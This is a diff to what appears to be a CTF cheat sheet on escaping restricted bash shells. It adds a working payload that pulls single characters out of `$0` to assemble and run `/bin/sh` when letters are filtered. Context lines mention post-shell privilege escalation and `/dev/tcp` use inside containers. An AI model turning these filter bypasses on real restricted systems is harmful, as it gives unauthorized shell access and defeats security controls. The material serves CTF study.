@@ -167,7 +167,27 @@ If `'` is available: `$'\101'` = `A`, `$'\142\141\163\150'` = `bash`
 
 **Key insight:** Build arbitrary strings from minimal character sets by combining `$#` (yields 0), `${##}` (yields 1), `$$` (PID digits), and ANSI-C quoting (`$'\NNN'` for octal). Even a 3-character alphabet (`#$\`) is sufficient to spawn a shell via `$0` expansion.
 
--
+**`$0` char-extraction escape (when `$0` = jail script path, letters blocked):**
+
+When only digits, `${}/:?"&>_=()` are allowed (no letters, no `\`), use `${0:N:1}` to extract characters from the script path and construct a shell binary path:
+
+1. **Probe `$0`** — trigger an error to reveal the path without printing it directly:
+   ```bash
+   # "${0:0:5}" → bash tries to execute first 5 chars as command → error reveals them
+   # Example error: "/home: Is a directory" → $0 starts with /home
+   ```
+2. **Map character positions** — extract chars you need (e.g., b, i, n, s, h for `/bin/sh`):
+   ```bash
+   # If $0 = /home/restricted_user/broken_shell.sh:
+   # b at pos 22, i at 11, n at 27, s at 8, h at 30
+   ```
+3. **Construct and execute** — double-quoted string expands then executes as command:
+   ```bash
+   "${0:0:1}${0:22:1}${0:11:1}${0:27:1}${0:0:1}${0:8:1}${0:30:1}"
+   # → /bin/sh → spawns unrestricted shell; subsequent stdin bypasses parent filter
+   ```
+
+All characters used (`"`, `$`, `{`, `}`, `:`, digits) are typically in filtered-shell allowed sets.
 
 ## Privilege Escalation Checklist (Post-Shell)
 
@@ -179,8 +199,6 @@ If `'` is available: `$'\101'` = `A`, `$'\142\141\163\150'` = `bash`
 6. **Docker/container:** `/dev/tcp` for internal service access, `/.dockerenv` presence
 
 **Key insight:** After escaping the jail, run through this checklist in order: SUID binaries and capabilities first (quickest wins), then internal services via `/proc/*/cmdline`, then writable PATH directories. In containers, use `/dev/tcp` for internal service access since netcat is rarely available.
-
--
 
 ## HISTFILE Trick for Restricted Shell File Reads
 
